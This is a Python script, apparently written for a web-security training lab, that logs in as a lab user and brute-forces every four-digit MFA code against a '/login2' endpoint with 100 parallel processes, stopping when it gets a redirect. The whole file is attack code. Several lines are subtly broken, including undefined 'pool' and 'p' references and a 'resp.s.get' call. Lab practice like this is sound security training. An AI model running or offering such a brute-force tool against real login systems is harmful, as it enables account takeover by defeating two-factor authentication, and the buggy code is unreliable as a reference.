import sys, requests, multiprocessing, time
from bs4 import BeautifulSoup


site = sys.argv[1]

if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

login_url = f'https://{site}/login'
login2_url = f'https://{site}/login2'
#Taken from getUrls_multiprocessing.py and adapted for this functionality
def time_decorator(func):
  """
  Takes a function and returns a version of it that prints out the elapsed time for executing it
  :param func: Function to decorate
  :return: Function which outputs execution time
  :rtype: Function
  """
  def inner(*args, **kwargs):
      s = time.perf_counter()
      return_vals = func(*args, **kwargs)
      elapsed = time.perf_counter() - s
      print(f'Function returned: {return_vals}')
      return(elapsed)
  return(inner)



#Does the bascic login functionality that was given in Code labs
def login_user(s):
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')

    logindata = {
    'csrf' : csrf,
    'username' : 'carlos',
    'password' : 'montoya'
    }
    
    # print(f'Logging in as carlos:montoya')
    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')
    # print(f'Login response: {resp.text}')

    return csrf
def complete(auth_code):
    pool.close()
    event.wait()
    p.terminate()
    print("=============================")
    print(f'== Auth Code:  {auth_code} ==')
    print("=============================")

def auth_check(auth_code, event):
    if not event.is_set():

        s = requests.Session()

        csrf = login_user(s)

        login2data = {
            'csrf' : csrf,
            'mfa-code' : auth_code
        }

        resp = s.post(login2_url, data=login2data, allow_redirects=False)
        if resp.status_code == 302:
            print(f'== Auth Code: {auth_code} || {resp.status_code} ==  <-- Correct')
            resp.s.get(f'https://{site}/my-account?id=carlos')
            complete(auth_code)
            event.set()
        
        if resp.status_code == 200:
            print(f'== Auth Code: {auth_code} || {resp.status_code} ==')
            pass
        else:
            print(f'== Auth Code: {auth_code} || {resp.status_code} ==')
            event.set()


#https://www.analyticsvidhya.com/blog/2021/04/a-beginners-guide-to-multi-processing-in-python/

@time_decorator
def run_test():
    multiplier = 4
    cpu_count = multiprocessing.cpu_count()
    pool = multiprocessing.Pool(100)

    procManager = multiprocessing.Manager()
    event = procManager.Event()

    auth_code = []
    for i in range(0, 10000):
        auth_code.append('%04d' % i)

    for i in range(10000):
        pool.apply_async(auth_check, (auth_code[i], event))
    pool.close()

    event.wait()
    p.terminate()

    

if __name__ == '__main__':
    run_test()